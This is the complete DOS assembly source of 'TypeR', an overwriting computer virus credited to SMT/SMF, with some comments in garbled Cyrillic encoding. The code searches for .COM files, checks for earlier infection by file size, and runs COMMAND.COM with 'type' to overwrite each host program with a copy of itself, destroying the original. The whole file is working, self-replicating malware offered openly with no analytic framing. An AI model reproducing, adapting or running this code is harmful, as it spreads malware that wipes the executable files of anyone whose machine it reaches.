   ;---------
   ;  TypeR written by SMT/SMF
   ;---------
   .model tiny
   .code
           org     100h

   start:
           mov bx,1000h
           mov ah,4ah
           int 21h                             ; set size of this
                                               ; program segment to 64K


           ; ‘ ãç¥â®¬ â®£®, çâ® int 20h íª¢¨¢ «¥â® ret, ¨
           ; â.k.  call sub
           ;       ret
           ; íª¢¨¢ «¥â® jmp sub,
           ; a jmp sub
           ;   sub: ...
           ; ¬®¦® ¯à®¯ãáâ¨âì !

   findfirst:
           mov     ah,4eh                      ; Find first file
           mov     cx,7                        ; Find all attributes

   findnext:

   SetDTA: push ax
           mov ah,19h
           inc ah                              ; can't use 1ah directly,
                                               ; because it is EOF
           mov dx,offset DTA
           push cs
           pop es
           push cs
           pop ds
           int 21h                             ; Set our own DTA
           pop ax
           mov     dx,offset comfilespec

           int     21h                         ; Find first/next file int
           jc      quit                        ; If none found then quit
           cmp word ptr cs:[DTA+1ah],virlen
           jz Skip                             ; file already infected :{
                                               ; - skip it!
           call TypeNow
   Skip:   mov     ah,4fh                      ; Find next file
           jmp     findnext                    ; Jump to the loop

   quit:
           ret

   TypeNow:                                    ; à §¬®¦¥¨¥

           mov ax,cs:[2ch]                     ; Get Dos environment segment
           mov ds,ax
           xor si,si                           ; Searching for COMSPEC
   l0:     cmp word ptr ds:[si],'OC'
           jnz noCOM
           cmp word ptr ds:[si+2],'SM'
           jnz noCOM
           cmp word ptr ds:[si+4],'EP'
           jz COM
   noCOM:  inc si
           jmp l0
   COM:    add si,8
           push si                             ; si = pointer to %comspec% value
           push ds                             ; push comspec var segment

   lll1:   inc si
           cmp word ptr ds:[si],0
           jnz lll1
           add si,4                            ; now ds:si points to this
                                               ; program path\filename
           mov di,offset thisprog
   lp2:    lodsb
           stosb
           or al,al
           jnz lp2                             ; copiing program name to
                                               ; command line
           mov word ptr cs:[di-1],'> '
           inc di

           mov ax,cs                           ; setting segments
           mov es,ax
           mov ds,ax
           mov cs:[cmdseg],ax

           mov si,offset DTA + 1eh
   lp3:    lodsb
           stosb
           or al,al
           jnz lp3                             ; copiing target name to
                                               ; command line
           mov ax,cs
           mov ds,ax                           ; ds=cs
           sub di,offset cmdline +2
           mov ax,di
           mov byte ptr cs:[cmdline],al

           pop ds
           pop dx                              ; dx = pointer to %comspec% value
           mov word ptr cs:[ss_save], ss
           mov word ptr cs:[sp_save], sp
           mov bx,offset EPB
           mov ax,4b00h
           int 21h                             ; execute command.com /c type
                                               ;  thisprog.com>target.com

           mov ax,1234h
   ss_save equ $-2
           mov ss,ax
           mov sp,1234h
   sp_save equ $-2
           ret                                 ; Search for next file

   ; =============== EPB =================
   EPB          dw 0                           ; exec parameters block
   cmdofs       dw offset cmdline
   cmdseg       dw 0
   ;---------------------------------------
   copyright    db '[TypeR] Made in SMF!'      ; copyright
   comfilespec  db '*.com',0
   cmdline      db 10                          ; length
                db '/c type '
   virlen       equ $-Start                    ; end of virus
   thisprog     db 100 dup (?)

   DTA          db 40 dup (?)

                end     start
